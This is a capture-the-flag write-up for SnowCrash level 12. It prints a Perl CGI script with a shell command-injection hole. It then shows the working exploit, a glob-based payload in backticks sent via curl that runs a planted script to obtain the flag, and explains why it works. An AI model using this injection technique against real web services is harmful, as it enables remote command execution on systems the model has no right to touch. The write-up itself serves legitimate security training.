# LEVEL 12

## Analysis

Let's chek what we have:
```bash
  level12@SnowCrash:~$ ls -la
  total 16
  dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
  d--x--x--x  1 root    users    340 Aug 30  2015 ..
  -r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
  -r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
  -rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
  -r-x------  1 level12 level12  675 Apr  3  2012 .profile
  level12@SnowCrash:~$ cat level12.pl 
  #!/usr/bin/env perl
  # localhost:4646
  use CGI qw{param};
  print "Content-type: text/html\n\n";

  sub t {
    $nn = $_[1];
    $xx = $_[0];
    $xx =~ tr/a-z/A-Z/; 
    $xx =~ s/\s.*//;
    @output = `egrep "^$xx" /tmp/xd 2>&1`;
    foreach $line (@output) {
        ($f, $s) = split(/:/, $line);
        if($s =~ $nn) {
            return 1;
        }
    }
    return 0;
  }

  sub n {
    if($_[0] == 1) {
        print("..");
    } else {
        print(".");
    }    
  }

  n(t(param("x"), param("y")));
```
We have a script running a webserver on port 4646. This line "$xx =~ tr/a-z/A-Z/" capitalize the first argument (x) and delete anything after a space so we can't directly write x="getflag>/tmp/token", which would be translated as "GETFLAG>/TMP/TOKEN. 

## Solution
We can create a file and execute it, using "*" to execute all files named SCRIPT inside all directories including /tmp.

```bash
  level12@SnowCrash:/tmp$ vim SCRIPT
  level12@SnowCrash:/tmp$ chmod 777 SCRIPT
  level12@SnowCrash:/tmp$ cat SCRIPT
  #!/bin/sh
  getflag > /tmp/flag

  level12@SnowCrash:/tmp$ cd ..
  level12@SnowCrash:/$ curl localhost:4646?x='`/*/SCRIPT`'
  ..level12@SnowCrash:/$ cat /tmp/flag
  Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

## Explaination

@output = `egrep "^$xx" /tmp/xd 2>&1` is the critical line. param("x") returns the raw string sent in the query.
For our curl that becomes the literal bytes: `/*/SCRIPT` (because we put the backticks inside single quotes client-side, so they arrive literally). $xx remains `/*/SCRIPT` because it is not affected by the translation to uppercase and there is no space. That $xx is interpolated directly into the backtick operator "egrep" because in Perl
the backtick operator runs a command through the shell (/bin/sh -c ...) and the string inside the backticks is built with interpolation first. So the actual shell command constructed is: egrep "^`/*/SCRIPT`" /tmp/xd 2>&1. The shell that receives that command will parse the backticks as command-substitution. That means the shell will try to execute whatever is between the backticks — in our case /*/SCRIPT.

